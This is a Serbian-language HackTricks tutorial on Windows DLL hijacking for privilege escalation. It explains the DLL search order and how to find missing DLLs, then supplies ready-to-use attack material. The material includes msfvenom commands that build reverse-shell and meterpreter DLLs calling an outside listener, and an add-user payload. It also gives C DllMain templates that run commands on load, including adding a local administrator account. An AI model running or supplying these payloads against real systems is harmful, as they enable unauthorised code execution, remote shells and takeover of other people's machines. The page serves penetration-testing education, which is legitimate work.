# Dll Hijacking

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Savet za bug bounty**: **prijavite se** za **Intigriti**, premium **platformu za bug bounty kreiranu od hakera, za hakere**! Pridružite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas, i počnite da zarađujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Osnovne informacije

DLL Hijacking uključuje manipulisanje pouzdane aplikacije da učita zlonamerni DLL. Ovaj termin obuhvata nekoliko taktika poput **DLL Spoofing-a, Injection-a i Side-Loading-a**. Glavno se koristi za izvršavanje koda, postizanje postojanosti i, ređe, eskalaciju privilegija. Bez obzira na fokus na eskalaciji ovde, metoda preuzimanja ostaje dosledna u svim ciljevima.

### Česte tehnike

Postoje nekoliko metoda koje se koriste za DLL preuzimanje, pri čemu je efikasnost svake zavisna od strategije učitavanja DLL-a aplikacije:

1. **Zamena DLL-a**: Zamena originalnog DLL-a zlonamernim, opciono korišćenjem DLL Proxying-a da bi se sačuvala funkcionalnost originalnog DLL-a.
2. **DLL Search Order Hijacking**: Postavljanje zlonamernog DLL-a u pretragu ispred legitimnog, iskorišćavajući šablon pretrage aplikacije.
3. **Phantom DLL Hijacking**: Kreiranje zlonamernog DLL-a za učitavanje od strane aplikacije, misleći da je to nepostojeći potreban DLL.
4. **DLL Redirection**: Modifikacija parametara pretrage poput `%PATH%` ili `.exe.manifest` / `.exe.local` fajlova da bi se aplikacija usmerila na zlonamerni DLL.
5. **WinSxS DLL Replacement**: Zamena legitimnog DLL-a zlonamernim pandanom u WinSxS direktorijumu, metoda često povezana sa DLL side-loading-om.
6. **Relative Path DLL Hijacking**: Postavljanje zlonamernog DLL-a u direktorijum koji kontroliše korisnik sa kopiranom aplikacijom, podsećajući na tehnike Binary Proxy Execution.

## Pronalaženje nedostajućih Dll-ova

Najčešći način pronalaženja nedostajućih Dll-ova unutar sistema je pokretanje [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) iz sysinternals-a, **postavljanjem** sledećih **2 filtera**:

![](<../../../.gitbook/assets/image (961).png>)

![](<../../../.gitbook/assets/image (230).png>)

i prikazivanje **File System Activity**:

![](<../../../.gitbook/assets/image (153).png>)

Ako tražite **nedostajuće dll-ove uopšte** ostavite ovo pokrenuto nekoliko **sekundi**.\
Ako tražite **nedostajući dll unutar određene izvršne datoteke** trebalo bi da postavite **drugi filter poput "Process Name" "contains" "\<ime izvršne datoteke>", izvršite je i zaustavite snimanje događaja**.

## Iskorišćavanje nedostajućih Dll-ova

Da bismo eskalirali privilegije, najbolja šansa koju imamo je da **napišemo dll koji će pokušati da učita privilegovani proces** na nekom od **mesta gde će biti pretražen**. Stoga ćemo moći da **napišemo** dll u **folderu** gde će se **dll pretraživati pre** foldera gde se nalazi **originalni dll** (čudan slučaj), ili ćemo moći da **pišemo u neki folder gde će se tražiti dll** i originalni **dll ne postoji** ni u jednom folderu.

### Redosled pretrage DLL-a

**Unutar** [**Microsoft dokumentacije**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **možete pronaći kako se DLL-ovi učitavaju specifično.**

**Windows aplikacije** traže DLL-ove prateći set **unapred definisanih putanja pretrage**, pridržavajući se određenog redosleda. Problem sa DLL preuzimanjem nastaje kada se štetan DLL strategijski postavi u jedan od ovih direktorijuma, osiguravajući da se učita pre autentičnog DLL-a. Rešenje za sprečavanje ovoga je osigurati da aplikacija koristi apsolutne putanje kada se odnosi na DLL-ove koje zahteva.

Možete videti **redosled pretrage DLL-ova na 32-bitnim** sistemima ispod:

1. Direktorijum iz kog je aplikacija učitana.
2. Sistemski direktorijum. Koristite [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) funkciju da biste dobili putanju ovog direktorijuma.(_C:\Windows\System32_)
3. 16-bitni sistemski direktorijum. Ne postoji funkcija koja dobavlja putanju ovog direktorijuma, ali se pretražuje. (_C:\Windows\System_)
4. Windows direktorijum. Koristite [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) funkciju da biste dobili putanju ovog direktorijuma.
1. (_C:\Windows_)
5. Trenutni direktorijum.
6. Direktorijumi navedeni u PATH okruženjskoj promenljivoj. Napomena: ovo ne uključuje putanju po aplikaciji navedenu ključem **App Paths** u registru. Ključ **App Paths** se ne koristi prilikom računanja putanje pretrage DLL-a.

To je **podrazumevani** redosled pretrage sa omogućenim **SafeDllSearchMode**-om. Kada je onemogućen, trenutni direktorijum se penje na drugo mesto. Da biste onemogućili ovu funkciju, kreirajte vrednost registra **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i postavite je na 0 (podrazumevano je omogućeno).

Ako se funkcija [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) poziva sa **LOAD\_WITH\_ALTERED\_SEARCH\_PATH** pretraga počinje u direktorijumu izvršnog modula koji **LoadLibraryEx** učitava.

Na kraju, imajte na umu da **dll može biti učitan navođenjem apsolutne putanje umesto samo imena**. U tom slučaju, taj dll će se **tražiti samo na toj putanji** (ako dll ima bilo kakve zavisnosti, biće tražene kao što su upravo učitane po imenu).

Postoje i drugi načini za izmenu redosleda pretrage, ali ih ovde neću objašnjavati.
#### Izuzeci u redosledu pretrage dll fajlova prema Windows dokumentaciji

Određeni izuzeci od standardnog redosleda pretrage DLL fajlova su navedeni u Windows dokumentaciji:

* Kada se naiđe na **DLL fajl koji deli ime sa već učitanim fajlom u memoriji**, sistem preskače uobičajenu pretragu. Umesto toga, vrši proveru preusmerenja i manifesta pre nego što se podrazumevano vrati na DLL već učitan u memoriju. **U ovom scenariju, sistem ne vrši pretragu za DLL fajlom**.
* U slučajevima kada se DLL prepozna kao **poznati DLL** za trenutnu verziju Windows-a, sistem će koristiti svoju verziju poznatog DLL fajla, zajedno sa svim zavisnim DLL fajlovima, **preskačući proces pretrage**. Ključ registra **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** sadrži listu ovih poznatih DLL fajlova.
* Ukoliko **DLL fajl ima zavisnosti**, pretraga za ovim zavisnim DLL fajlovima se vrši kao da su naznačeni samo njihovi **nazivi modula**, bez obzira da li je početni DLL identifikovan putanjom.

### Eskalacija privilegija

**Zahtevi**:

* Identifikovati proces koji radi ili će raditi pod **različitim privilegijama** (horizontalno ili lateralno kretanje), koji **nedostaje DLL fajl**.
* Osigurati da je **dostupan pristup pisanju** za bilo koju **direktorijum** u kojem će se **tražiti DLL**. Ova lokacija može biti direktorijum izvršne datoteke ili direktorijum unutar sistemskog puta.

Da, zahtevi su komplikovani za pronaći jer je **podrazumevano pomalo čudno pronaći privilegovanu izvršnu datoteku koja nedostaje dll fajlu** i još je **čudnije imati dozvole za pisanje u folderu sistema** (to nije moguće podrazumevano). Međutim, u neskonfigurisanim okruženjima ovo je moguće.\
U slučaju da imate sreće i ispunjavate zahteve, možete proveriti projekat [UACME](https://github.com/hfiref0x/UACME). Iako je **glavni cilj projekta zaobilazak UAC-a**, tamo možete pronaći **PoC** za Dll preusmeravanje za Windows verziju koju možete koristiti (verovatno samo menjajući putanju foldera u kojem imate dozvole za pisanje).

Imajte na umu da možete **proveriti svoje dozvole u folderu** koristeći:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I proverite dozvole svih foldera unutar PUTANJE:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Takođe možete proveriti uvoze izvršne datoteke i izvoze DLL datoteke pomoću:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Za potpuni vodič o tome kako **zloupotrebiti Dll Hijacking radi eskalacije privilegija** sa dozvolama za pisanje u **System Path folderu** proverite:

{% content-ref url="writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Automatizovani alati

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) će proveriti da li imate dozvole za pisanje u bilo kom folderu unutar sistema PATH.\
Drugi zanimljivi automatizovani alati za otkrivanje ove ranjivosti su **PowerSploit funkcije**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._

### Primer

U slučaju da pronađete iskorišćiv scenarij, jedna od najvažnijih stvari za uspešno iskorišćavanje bilo bi **kreiranje dll-a koji izvozi barem sve funkcije koje će izvršna datoteka uvesti iz njega**. U svakom slučaju, imajte na umu da Dll Hijacking dolazi u ruci kako bi [eskaliro od srednjeg nivoa integriteta do visokog **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/#uac) ili od [**visokog integriteta do SYSTEM-a**](../#from-high-integrity-to-system)**.** Možete pronaći primer **kako kreirati validan dll** unutar ovog studija o dll hijackingu fokusiranom na dll hijacking za izvršavanje: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Osim toga, u **narednoj sekciji** možete pronaći neke **osnovne dll kodove** koji mogu biti korisni kao **predlošci** ili za kreiranje **dll-a sa neobaveznim izvezenim funkcijama**.

## **Kreiranje i kompajliranje Dll-ova**

### **Dll Proksiranje**

U osnovi, **Dll proxy** je Dll sposoban da **izvrši vaš zlonamerni kod prilikom učitavanja**, ali takođe i da **izloži** i **radi** kao **očekivano** prenoseći sve pozive pravoj biblioteci.

Pomoću alata [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) možete zapravo **označiti izvršnu datoteku i izabrati biblioteku** koju želite da proksirate i **generisati proksifikovani dll** ili **označiti Dll** i **generisati proksifikovani dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Dobijanje meterpretera (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kreirajte korisnika (x86 Nisam video x64 verziju):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Tvoj sopstveni

Imajte na umu da u nekoliko slučajeva Dll koji kompajlirate mora **izvoziti nekoliko funkcija** koje će biti učitane od strane procesa žrtve, ako ove funkcije ne postoje, **binarni fajl neće moći da ih učita** i **eksploatacija će neuspeti**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Reference

* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Savet o nagradi za otkrivanje grešaka**: **prijavite se** za **Intigriti**, premium **platformu za otkrivanje grešaka kreiranu od hakera, za hakere**! Pridružite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas, i počnite da zarađujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
